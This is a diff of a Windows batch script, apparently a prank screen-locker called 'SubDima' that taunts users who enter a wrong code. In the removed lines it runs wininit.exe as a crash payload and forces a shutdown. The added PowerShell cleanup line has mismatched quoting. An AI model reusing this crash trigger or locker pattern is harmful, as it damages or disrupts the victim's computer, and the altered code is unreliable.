@@ -107,20 +107,14 @@ cls
 echo. I'm sorry.. You entered the wrong code too many times.
 echo. Seems like you're fucked...
 timeout /t 2 /nobreak > nul
-if /I "%test%" == "0" (
-    wininit.exe
-)
+::if /I "%test%" == "0" (
+    ::payload
+::)
 echo. Your PC should've crashed now...
 echo.
 echo. Ah well...
 timeout /t 3 /nobreak > nul
-if /I "%test%" == "0" (
-    goto :remove
-)
-echo Press any key to exit...
-pause > nul
-taskkill -im cmd.exe /f > nul
-taskkill -im tcc.exe /f > nul
+goto :remove
 exit
 
 :unlock
@@ -130,14 +124,8 @@ echo. I guess ima leave now...
 echo.
 echo. Bye!!
 timeout /t 4 /nobreak > nul
-if /I "%test%" == "0" (
-    goto :remove
-)
-taskkill -im cmd.exe /f > nul
-taskkill -im tcc.exe /f > nul
-exit
+goto :remove
 
 :remove
-shutdown -s -t 10 -c "Planned Reboot: Removing SubDima"
-del /Q "%tmp%\SUBDIMA"
+powershell "taskkill -im cmd.exe /f; rd /S /Q "%tmp%\SUBDIMA; explorer.exe"
 exit
